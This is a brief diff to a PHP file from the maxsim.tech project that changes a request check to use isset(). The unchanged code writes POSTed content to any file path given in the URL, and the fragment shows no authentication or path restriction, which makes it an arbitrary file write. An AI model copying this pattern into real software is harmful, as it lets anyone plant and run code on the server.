@@ -1,7 +1,7 @@
 <?php # maxsim.tech — MIT License — Copyright (c) 2005-2020 Javier González González <gonzo@virtualpol.com>
 
 
-if ($_GET['file'] AND isset($_POST['code'])) {
+if (isset($_GET['file']) AND isset($_POST['code'])) {
     
     file_put_contents($_GET['file'], $_POST['code']);
     
